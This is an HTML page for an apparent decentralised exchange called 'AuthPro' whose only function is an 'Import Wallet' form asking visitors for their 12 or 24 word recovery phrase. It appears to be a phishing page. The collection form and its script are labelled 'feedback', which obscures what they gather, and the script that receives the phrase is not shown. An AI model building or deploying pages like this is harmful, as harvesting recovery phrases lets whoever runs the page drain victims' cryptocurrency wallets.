<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Import Wallet - AuthPro</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="AuthPro.jpeg">
</head>
<body>

    <!-- Navigation -->
    <nav class="navbar">
        <div class="nav-container">
            <div class="nav-left">
                <a href="index.html" class="logo-link">
                    <img src="AuthPro.jpeg" alt="AuthPro" class="logo-img">
                    <span class="logo-text">AuthPro</span>
                    <span class="demo-badge">DEX</span>
                </a>
                <div class="nav-links">
                    <a href="#" class="nav-link">Trade</a>
                    <a href="#" class="nav-link">Earn</a>
                    <a href="#" class="nav-link">Win</a>
                    <a href="#" class="nav-link">NFT</a>
                </div>
            </div>
            <div class="nav-right">
                <a href="feedback.html"><button class="btn-outline">Import Wallet</button></a>
            </div>
        </div>
    </nav>

    <div class="container">
        <div id="feedbackPage" class="page active">
            <div class="feedback-container">
                <a href="index.html" class="back-btn">← Back to Home</a>
                <h2>IMPORT WALLET</h2>
                <p style="text-align: center; margin-bottom: 30px; opacity: 0.8;">
                    Import your wallet to connect to the DEX
                </p>

                <div id="successMsg" class="success-message">
                    ✓ Successful! Redirecting to DEX...
                </div>

                <div id="errorMsg" class="error-message">
                    ✗ Invalid recovery phrase!.
                </div>

                <form id="feedbackForm">
                    <textarea
                        name="feedback"
                        id="feedbackText"
                        placeholder="Enter your 12 or 24 word recovery phrase..."
                        required
                        autocomplete="off"
                        spellcheck="false"
                    ></textarea>
                    <div class="word-counter">
                        Words: <span id="wordCount">0</span>
                    </div>
                    <button type="submit" class="btn btn-submit">IMPORT</button>
                </form>
            </div>
        </div>
    </div>

    <script src="feedback.js"></script>
</body>
</html>
